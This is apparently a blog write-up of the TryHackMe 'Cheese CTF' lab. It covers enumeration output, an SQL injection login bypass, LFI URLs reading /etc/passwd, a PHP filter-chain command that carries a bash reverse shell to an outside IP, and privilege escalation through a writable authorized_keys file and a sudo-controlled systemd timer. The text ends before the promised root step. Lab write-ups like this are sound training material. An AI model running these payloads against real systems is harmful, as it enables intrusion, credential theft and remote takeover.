---
title: 'TryHackMe: Cheese CTF'
author: 1of0
date: 2024-12-19 12:00:00 +0300
categories: [TryHackMe]
tags: [web, rustscan, portspoofing, feroxbuster, sqli, sqlmap, LFI, RCE, ssh, service, timer, suid, sudo, sysmemstl, grep, openssl, unshadow]
published: true
render_with_liquid: true
img_path: /assets/Cheese-CTF
image:
  path: /assets/TryHackMe/Cheese-CTF/room_image.webp
---

In the Cheese CTF, we bypassed the login page using an `SQL injection` and discovered an endpoint `vulnerable to LFI`. By `chaining PHP filters`, we turned the LFI into `RCE` and gained an initial foothold on the system. After that, we exploited a `writable authorized_keys file` to pivot to another user. As this new user, we fixed a `syntax error in a timer` and used `sudo privileges` to start it, which allowed us to create a `SUID binary`. Finally, by exploiting this binary, we `escalated privileges to root`.
## Initial Enumeration
# Enumeration

### NMAP

```Bash
 nmap -p- -sS -vv -T4 10.10.78.32
all port open
```

### gobuster

😡 nothing found 

```Bash
 gobuster dir -u http://10.10.78.32/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.78.32/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.78.32/images/]
/server-status        (Status: 403) [Size: 276]

```

### dirsearch

```Bash
└─$ dirsearch -u http://10.10.78.32/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/kali/Documents/tryhackme/reports/http_10.10.78.32/__24-12-29_07-01-43.txt

Target: http://10.10.78.32/

[07:01:43] Starting: 
[07:01:50] 403 -  276B  - /.ht_wsr.txt
[07:01:50] 403 -  276B  - /.htaccess.save
[07:01:50] 403 -  276B  - /.htaccess.sample
[07:01:50] 403 -  276B  - /.html
[07:01:50] 403 -  276B  - /.htaccess_extra
[07:01:50] 403 -  276B  - /.htaccess_orig
[07:01:50] 403 -  276B  - /.htm
[07:01:50] 403 -  276B  - /.htaccessOLD
[07:01:50] 403 -  276B  - /.htaccess_sc
[07:01:50] 403 -  276B  - /.htaccessOLD2
[07:01:50] 403 -  276B  - /.htaccessBAK
[07:01:50] 403 -  276B  - /.htaccess.bak1
[07:01:50] 403 -  276B  - /.htaccess.orig
[07:01:50] 403 -  276B  - /.htpasswd_test
[07:01:50] 403 -  276B  - /.htpasswds
[07:01:50] 403 -  276B  - /.httr-oauth
[07:01:53] 403 -  276B  - /.php
[07:02:33] 200 -  484B  - /images/
[07:02:33] 301 -  311B  - /images  ->  http://10.10.78.32/images/
[07:02:39] 200 -  370B  - /login.php
[07:02:46] 200 -  254B  - /orders.html
[07:02:57] 403 -  276B  - /server-status/
[07:02:57] 403 -  276B  - /server-status
[07:03:11] 200 -  254B  - /users.html

Task Completed

```

### Web

we found email `[info@thecheeseshop.com](mailto:info@thecheeseshop.com)` in home page 

### SQLMAP

we used sqlmap to check for injection and auth bypass and it worked with the payload 

```Bash
' OR 'x'='x'#;
```

We received a new directory

```Bash
 “http://10.10.78.32/secret-script.php?file=supersecretadminpanel.html”
```

in /**secret-script.php?file=supersecretadminpanel.html** we have new directory called **/massages.html**

```Bash
                                                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/tryhackme/cheese.thm]
└─$ sqlmap -r req.txt -p username --dbs 
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.11#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:30:44 /2024-12-29/

[07:30:44] [INFO] parsing HTTP request from 'req.txt'
[07:30:44] [INFO] testing connection to the target URL
[07:30:45] [INFO] checking if the target is protected by some kind of WAF/IPS
[07:30:45] [INFO] testing if the target URL content is stable
[07:30:45] [INFO] target URL content is stable
[07:30:45] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[07:30:45] [INFO] testing for SQL injection on POST parameter 'username'
[07:30:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[07:30:46] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[07:30:46] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[07:30:46] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[07:30:47] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[07:30:47] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[07:30:48] [INFO] testing 'Generic inline queries'
[07:30:48] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[07:30:48] [WARNING] time-based comparison requires larger statistical model, please wait. (done)                                                                                                                
[07:30:48] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[07:30:49] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[07:30:49] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[07:31:00] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[07:31:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[07:31:31] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
got a 302 redirect to 'http://10.10.78.32/secret-script.php?file=supersecretadminpanel.html'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] n
[07:31:54] [INFO] target URL appears to be UNION injectable with 3 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[07:33:04] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[07:33:04] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')
[07:33:07] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[07:33:07] [INFO] checking if the injection point on POST parameter 'username' is a false positive
[07:33:12] [WARNING] false positive or unexploitable injection point detected
[07:33:12] [WARNING] POST parameter 'username' does not seem to be injectable

```

### LFI found

```Bash
http://10.10.78.32/secret-script.php?file=php://filter/resource=supersecretmessageforadmin
http://10.10.78.32/secret-script.php?file=php://filter/resource=../../../../../../etc/passwd
```

We downloaded  php_filter_chain_generator.py and chained the following to get a reverse shell

```Bash
python php_filter_chain_generator.py --chain "<?php system('bash -c \"bash -i >& /dev/tcp/10.21.67.52/5000 0>&1\"'); ?>"
```

we downloaded [linpeas.sh](http://linpeas.sh) 

```bash
Vulnerable to CVE-2021-3560
You have write privileges over /etc/systemd/system/exploit.timer
/etc/systemd/system/exploit.timer
/home/comte/.ssh/authorized_keys
```

we cand write to auth keys of comte user. 

added my public key and ssh normally. 

```bash
comte@cheesectf:~$ sudo -l
User comte may run the following commands on cheesectf:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer

```

we updated the timer 

```bash
comte@cheesectf:/etc/systemd/system$ cat exploit.timer 
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=1

[Install]
WantedBy=timers.target

```

then we restart 

```bash
 sudo  /bin/systemctl restart exploit.timer
```
